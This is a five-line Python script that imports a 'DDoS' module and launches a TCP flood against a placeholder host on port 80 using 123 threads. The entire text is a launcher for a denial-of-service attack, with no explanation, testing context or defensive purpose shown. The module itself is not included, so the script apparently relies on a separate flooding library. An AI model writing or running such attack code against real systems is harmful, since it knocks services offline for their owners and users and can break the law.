import DDoS
host = 'host'
thr = 123
attacker = DDoS.DDoS(host, 80, DDoS.TCP(), DDoS.UTF8(), thr)
attacker.start()
